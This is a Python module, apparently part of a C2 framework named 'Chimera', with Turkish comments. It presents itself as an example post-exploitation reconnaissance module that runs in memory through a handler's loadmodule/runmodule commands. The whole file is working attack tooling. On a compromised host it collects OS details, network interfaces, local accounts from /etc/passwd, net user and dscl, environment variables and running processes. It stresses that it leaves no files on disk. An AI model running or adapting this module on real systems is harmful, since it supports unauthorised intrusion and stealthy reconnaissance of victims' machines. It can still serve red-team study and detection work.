"""
Chimera Example Post-Exploitation Module
-----------------------------------------
Bu modül, loadmodule / runmodule (In-Memory Execution) altyapısını test etmek
ve örnek göstermek amacıyla yazılmıştır.

Kullanım (Handler tarafından):
    chimera (1) > loadmodule modules/post/chimera/example_post.py
    chimera (1) > runmodule example_post
    chimera (1) > runmodule example_post run          # aynı sonuç (varsayılan)
    chimera (1) > runmodule example_post quick        # hızlı özet
    chimera (1) > runmodule example_post network      # sadece ağ bilgisi
    chimera (1) > runmodule example_post processes    # sadece süreçler
    chimera (1) > runmodule example_post users        # sadece kullanıcılar

Önemli Kural:
    - Bu modül yalnızca Python standart kütüphanelerini kullanır.
    - Diske HİÇBİR dosya yazmaz; tüm işlem RAM üzerinde gerçekleşir.
    - Tüm public fonksiyonlar str döndürür; handler ekrana basar.
"""

import os
import sys
import platform
import socket
import subprocess
import struct
import time


# ── Yardımcı: Komutu güvenli şekilde çalıştır ─────────────────────────────────

def _run(cmd: str, timeout: int = 10) -> str:
    """Sistem komutunu çalıştırır; hata durumunda boş string döner."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        output = result.stdout.strip()
        if not output and result.stderr.strip():
            return result.stderr.strip()
        return output
    except Exception:
        return ""


# ── Bilgi Toplama Fonksiyonları ────────────────────────────────────────────────

def _collect_os() -> dict:
    """İşletim sistemi ve donanım özetini toplar."""
    uname = platform.uname()
    return {
        "os"       : f"{uname.system} {uname.release} ({uname.version})",
        "machine"  : uname.machine,
        "hostname" : uname.node,
        "python"   : f"{sys.version.split()[0]} ({platform.python_implementation()})",
        "pid"      : os.getpid(),
        "cwd"      : os.getcwd(),
        "arch_bits": struct.calcsize("P") * 8,
        "user"     : _get_user(),
    }


def _get_user() -> str:
    """Mevcut kullanıcı adını döner."""
    try:
        if sys.platform == "win32":
            return os.environ.get("USERNAME", "unknown")
        return os.environ.get("USER", _run("whoami"))
    except Exception:
        return "unknown"


def _collect_network() -> list:
    """Ağ arayüzlerini ve IP adreslerini toplar."""
    interfaces = []
    try:
        hostname = socket.gethostname()
        # Ana IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect(("8.8.8.8", 80))
            primary_ip = s.getsockname()[0]
            s.close()
        except Exception:
            primary_ip = "Belirlenemedi"

        interfaces.append({"name": "primary", "ip": primary_ip})

        # Platform'a göre ek arayüzler
        if sys.platform == "win32":
            raw = _run("ipconfig")
            current_adapter = None
            for line in raw.splitlines():
                line = line.strip()
                if "adapter" in line.lower() or "bağdaştırıcı" in line.lower():
                    current_adapter = line.rstrip(":").strip()
                if "IPv4" in line or "IP Address" in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        ip = parts[1].strip()
                        if ip and ip != primary_ip:
                            interfaces.append({"name": current_adapter or "unknown", "ip": ip})
        else:
            # Linux / macOS
            raw = _run("ip addr 2>/dev/null || ifconfig 2>/dev/null")
            for line in raw.splitlines():
                if "inet " in line:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        ip = parts[1].split("/")[0]
                        if ip and ip != primary_ip and ip != "127.0.0.1":
                            interfaces.append({"name": "iface", "ip": ip})

    except Exception:
        pass

    return interfaces


def _collect_processes(limit: int = 20) -> list:
    """Çalışan süreçleri toplar (ilk `limit` adet)."""
    procs = []
    try:
        if sys.platform == "win32":
            raw = _run("tasklist /FO CSV /NH", timeout=15)
            for line in raw.splitlines()[:limit]:
                parts = line.strip('"').split('","')
                if len(parts) >= 5:
                    procs.append({
                        "name"   : parts[0],
                        "pid"    : parts[1],
                        "memory" : parts[4].strip()
                    })
        else:
            raw = _run("ps aux --sort=-%mem 2>/dev/null || ps aux 2>/dev/null", timeout=15)
            lines = raw.splitlines()
            # Başlık satırını atla
            for line in lines[1:limit + 1]:
                cols = line.split(None, 10)
                if len(cols) >= 11:
                    procs.append({
                        "user"   : cols[0],
                        "pid"    : cols[1],
                        "cpu"    : cols[2] + "%",
                        "mem"    : cols[3] + "%",
                        "cmd"    : cols[10][:50]
                    })
    except Exception:
        pass
    return procs


def _collect_users() -> list:
    """Sistemdeki yerel kullanıcıları listeler."""
    users = []
    try:
        if sys.platform == "win32":
            raw = _run("net user", timeout=10)
            # "-----" sonrası kullanıcılar listesi
            capture = False
            for line in raw.splitlines():
                if "---" in line:
                    capture = True
                    continue
                if capture and line.strip() and "The command" not in line:
                    for user in line.split():
                        users.append(user.strip())
        elif sys.platform == "darwin":
            raw = _run("dscl . -list /Users 2>/dev/null", timeout=10)
            for u in raw.splitlines():
                u = u.strip()
                if u and not u.startswith("_"):
                    users.append(u)
        else:
            # Linux: /etc/passwd'den okuma
            try:
                with open("/etc/passwd", "r") as f:
                    for line in f:
                        parts = line.split(":")
                        if len(parts) >= 7 and "/bin/" in parts[6]:
                            users.append(parts[0])
            except Exception:
                raw = _run("cut -d: -f1 /etc/passwd", timeout=5)
                users = raw.splitlines()
    except Exception:
        pass
    return users


def _collect_env_vars(keys: list = None) -> dict:
    """Önemli ortam değişkenlerini toplar."""
    interesting = keys or [
        "PATH", "HOME", "USER", "USERNAME", "COMPUTERNAME",
        "APPDATA", "TEMP", "TMP", "SHELL", "LOGNAME",
        "HOSTNAME", "USERPROFILE", "PROGRAMFILES",
        "SystemRoot", "windir"
    ]
    result = {}
    for key in interesting:
        val = os.environ.get(key)
        if val:
            result[key] = val
    return result


# ── Formatlama Yardımcıları ────────────────────────────────────────────────────

def _header(title: str, width: int = 60) -> str:
    bar = "═" * width
    return f"\n╔{bar}╗\n║  {title:<{width - 2}}║\n╚{bar}╝"


def _section(title: str, width: int = 60) -> str:
    return f"\n── {title} {'─' * (width - len(title) - 4)}"


def _kv(label: str, value: str, indent: int = 2) -> str:
    pad = " " * indent
    return f"{pad}{label:<20}: {value}"


# ── Public Fonksiyonlar (runmodule tarafından çağrılır) ───────────────────────

def run() -> str:
    """
    Tam keşif raporu.
    Handler komutu: runmodule example_post
    """
    lines = [_header("CHIMERA — Örnek Post-Exploitation Keşif Raporu")]
    lines.append(f"  Tarih/Saat : {time.strftime('%Y-%m-%d %H:%M:%S')}")

    # ── 1. İşletim Sistemi ────────────────────────────────────
    lines.append(_section("1. İşletim Sistemi / Donanım"))
    os_info = _collect_os()
    lines.append(_kv("OS",         os_info["os"]))
    lines.append(_kv("Mimari",     f"{os_info['machine']} ({os_info['arch_bits']}-bit)"))
    lines.append(_kv("Hostname",   os_info["hostname"]))
    lines.append(_kv("Kullanıcı",  os_info["user"]))
    lines.append(_kv("PID (ajan)", str(os_info["pid"])))
    lines.append(_kv("CWD",        os_info["cwd"]))
    lines.append(_kv("Python",     os_info["python"]))

    # ── 2. Ağ ─────────────────────────────────────────────────
    lines.append(_section("2. Ağ Arayüzleri"))
    ifaces = _collect_network()
    if ifaces:
        for iface in ifaces:
            lines.append(_kv(iface.get("name", "iface"), iface.get("ip", "?")))
    else:
        lines.append("  Ağ bilgisi alınamadı.")

    # ── 3. Yerel Kullanıcılar ─────────────────────────────────
    lines.append(_section("3. Yerel Kullanıcılar"))
    users = _collect_users()
    if users:
        for u in users:
            lines.append(f"  • {u}")
    else:
        lines.append("  Kullanıcı listesi alınamadı.")

    # ── 4. Ortam Değişkenleri ─────────────────────────────────
    lines.append(_section("4. Önemli Ortam Değişkenleri"))
    env = _collect_env_vars()
    if env:
        for k, v in env.items():
            lines.append(_kv(k, v[:80]))
    else:
        lines.append("  Ortam değişkeni alınamadı.")

    # ── 5. Aktif Süreçler (ilk 15) ────────────────────────────
    lines.append(_section("5. Aktif Süreçler (İlk 15)"))
    procs = _collect_processes(limit=15)
    if procs:
        if sys.platform == "win32":
            lines.append(f"  {'İSİM':<30} {'PID':<8} {'MEMORY'}")
            lines.append(f"  {'─'*29} {'─'*7} {'─'*15}")
            for p in procs:
                lines.append(f"  {p['name']:<30} {p['pid']:<8} {p['memory']}")
        else:
            lines.append(f"  {'USER':<12} {'PID':<7} {'CPU':>5} {'MEM':>5}  COMMAND")
            lines.append(f"  {'─'*11} {'─'*6} {'─'*5} {'─'*5}  {'─'*30}")
            for p in procs:
                lines.append(
                    f"  {p['user']:<12} {p['pid']:<7} "
                    f"{p['cpu']:>5} {p['mem']:>5}  {p['cmd']}"
                )
    else:
        lines.append("  Süreç listesi alınamadı.")

    lines.append(f"\n{'═' * 62}")
    lines.append(f"  [+] Keşif tamamlandı. Toplam {len(procs)} süreç listelendi.")
    lines.append(f"{'═' * 62}\n")

    return "\n".join(lines)


def quick() -> str:
    """
    Hızlı tek-satır özet (tüm rapor yerine sadece kritik bilgiler).
    Handler komutu: runmodule example_post quick
    """
    os_info = _collect_os()
    ifaces  = _collect_network()
    primary_ip = ifaces[0]["ip"] if ifaces else "?"

    lines = [
        _header("CHIMERA — Hızlı Özet"),
        _kv("Hostname",   os_info["hostname"]),
        _kv("Kullanıcı",  os_info["user"]),
        _kv("OS",         os_info["os"]),
        _kv("Birincil IP", primary_ip),
        _kv("CWD",        os_info["cwd"]),
        _kv("PID (ajan)", str(os_info["pid"])),
    ]
    return "\n".join(lines)


def network() -> str:
    """
    Sadece ağ bilgisi.
    Handler komutu: runmodule example_post network
    """
    ifaces = _collect_network()
    lines = [_header("CHIMERA — Ağ Bilgisi")]
    if ifaces:
        for iface in ifaces:
            lines.append(_kv(iface.get("name", "iface"), iface.get("ip", "?")))
    else:
        lines.append("  Ağ bilgisi alınamadı.")
    return "\n".join(lines)


def processes() -> str:
    """
    Sadece çalışan süreçler (ilk 30).
    Handler komutu: runmodule example_post processes
    """
    procs = _collect_processes(limit=30)
    lines = [_header("CHIMERA — Aktif Süreçler (İlk 30)")]
    if procs:
        if sys.platform == "win32":
            lines.append(f"  {'İSİM':<30} {'PID':<8} {'MEMORY'}")
            lines.append(f"  {'─'*29} {'─'*7} {'─'*15}")
            for p in procs:
                lines.append(f"  {p['name']:<30} {p['pid']:<8} {p['memory']}")
        else:
            lines.append(f"  {'USER':<12} {'PID':<7} {'CPU':>5} {'MEM':>5}  COMMAND")
            lines.append(f"  {'─'*11} {'─'*6} {'─'*5} {'─'*5}  {'─'*30}")
            for p in procs:
                lines.append(
                    f"  {p['user']:<12} {p['pid']:<7} "
                    f"{p['cpu']:>5} {p['mem']:>5}  {p['cmd']}"
                )
    else:
        lines.append("  Süreç listesi alınamadı.")
    return "\n".join(lines)


def users() -> str:
    """
    Sadece yerel kullanıcı listesi.
    Handler komutu: runmodule example_post users
    """
    user_list = _collect_users()
    lines = [_header("CHIMERA — Yerel Kullanıcılar")]
    if user_list:
        for u in user_list:
            lines.append(f"  • {u}")
        lines.append(f"\n  Toplam: {len(user_list)} kullanıcı")
    else:
        lines.append("  Kullanıcı listesi alınamadı.")
    return "\n".join(lines)


def env() -> str:
    """
    Sadece ortam değişkenleri.
    Handler komutu: runmodule example_post env
    """
    env_vars = _collect_env_vars()
    lines = [_header("CHIMERA — Ortam Değişkenleri")]
    if env_vars:
        for k, v in env_vars.items():
            lines.append(_kv(k, v[:80]))
    else:
        lines.append("  Ortam değişkeni alınamadı.")
    return "\n".join(lines)
